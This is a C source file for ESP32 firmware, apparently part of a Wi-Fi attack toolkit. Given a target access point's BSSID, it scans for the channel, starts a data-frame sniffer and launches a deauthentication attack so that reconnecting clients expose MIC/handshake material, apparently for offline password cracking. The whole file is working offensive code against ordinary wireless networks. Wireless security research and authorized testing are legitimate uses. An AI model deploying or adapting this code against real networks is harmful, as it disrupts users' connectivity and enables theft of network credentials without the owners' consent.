#include "arma_mic.h"

#include <stdio.h>
#include <string.h>

#include "arma_deauth.h"
#include "arma_utils.h"
#include "esp_err.h"
#include "esp_event.h"
#include "frame_parser_interface.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "wifi_ctl_interface.h"

ESP_EVENT_DECLARE_BASE(ARMAMENT_ATTACK_STATUS_EVENT_BASE);
static uint8_t int_target_bssid[6];
static TaskHandle_t mic_sniff_task_handle = NULL;

void mic_notif(void *args, esp_event_base_t event_base, int32_t event_id,
               void *event_data) {
  arma_atk_event_data_t *notification_data;
  notification_data = (arma_atk_event_data_t *)event_data;

  if (notification_data->atk_context == MIC_BASED) {
    printf("arma_mic.mic_notif > Received notification\n");
    arma_mic_finishing_sequence(0);
  }
}

void arma_mic_notif_event_register() {
  ESP_ERROR_CHECK(esp_event_handler_register(
      ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &mic_notif, NULL));
  printf("arma_mic.arma_mic_notif_event_register > *\n");
}

void arma_mic_notif_event_unregister() {
  ESP_ERROR_CHECK(esp_event_handler_unregister(
      ARMAMENT_ATTACK_STATUS_EVENT_BASE, ATK_STATS_EVENT_ID, &mic_notif));
  printf("arma_mic.arma_mic_notif_event_unregister > *\n");
}

void arma_delete_task_mic_sniff_duration() {
  if (mic_sniff_task_handle != NULL) {
    vTaskDelete(mic_sniff_task_handle);
    mic_sniff_task_handle = NULL;
  }
}

void arma_mic_finishing_sequence(uint8_t from_sniff_task) {
  printf("arma_mic.arma_mic_finishing_sequence > Finishing sequence\n");
  frame_parser_unregister_data_frame_handler();
  frame_parser_clear_target_parameter();
  arma_mic_notif_event_unregister();
  wifi_sniffer_stop();
  // Uses the deauth armament to deauthenticate clients
  arma_deauth_finish();
  // Kill the task mic sniff duration
  if (from_sniff_task == 0) {
    arma_delete_task_mic_sniff_duration();
  }
}

void arma_mic_sniff_duration() {
  while (1) {
    vTaskDelay(5000 / portTICK_PERIOD_MS);
    printf("arma_mic.arma_mic_sniff_duration > %02X%02X%02X%02X%02X%02X\n",
           int_target_bssid[0], int_target_bssid[1], int_target_bssid[2],
           int_target_bssid[3], int_target_bssid[4], int_target_bssid[5]);

    arma_mic_finishing_sequence(1);
    vTaskDelete(NULL);
    mic_sniff_task_handle = NULL;
  }
}

void arma_mic_launching_sequence(uint8_t channel) {
  printf("arma_mic.arma_mic_launching_sequence > Launching sequence\n");
  frame_parser_set_target_parameter(int_target_bssid, PARSE_MIC);
  frame_parser_register_data_frame_handler();
  arma_mic_notif_event_register();
  wifi_sniffer_start();
  wifi_set_filter(DATA);
  wifi_set_channel(channel);
  // Uses the deauth armament to deauthenticate clients
  arma_mic_set_target_bssid(int_target_bssid);
  arma_deauth_launching_sequence(channel);
  // Create a the task MIC sniff duration
  xTaskCreatePinnedToCore(arma_mic_sniff_duration, TMS_NAME, TMS_STACK_SIZE,
                          NULL, TMS_PRIORITY, &mic_sniff_task_handle,
                          TMS_CORE_ID);
}

void arma_mic(char *target_bssid) {
  for (uint8_t i = 0; i < 6; i++) {
    uint8_t s1 = target_bssid[i + i];
    uint8_t s2 = target_bssid[i + i + 1];
    int_target_bssid[i] = convert_to_uint8_t(s1, s2);
  }

  wifi_scan_aps();
  ap_list_from_scan_t *ap_list = wifi_get_scanned_aps();
  wifi_ap_record_t *ap_records = ap_list->ap_record_list;
  uint16_t total_scanned_aps = ap_list->count;

  for (uint16_t i = 0; i < total_scanned_aps; i++) {
    wifi_ap_record_t ap_record = ap_records[i];
    output_ap_info(&ap_record);

    if (memcmp(ap_record.bssid, int_target_bssid, 6) == 0) {
      uint8_t channel = ap_record.primary;
      printf("arma_mic.arma_mic > Channel of ap is %u\n", channel);

      arma_mic_launching_sequence(channel);
      break;
    }
  }
}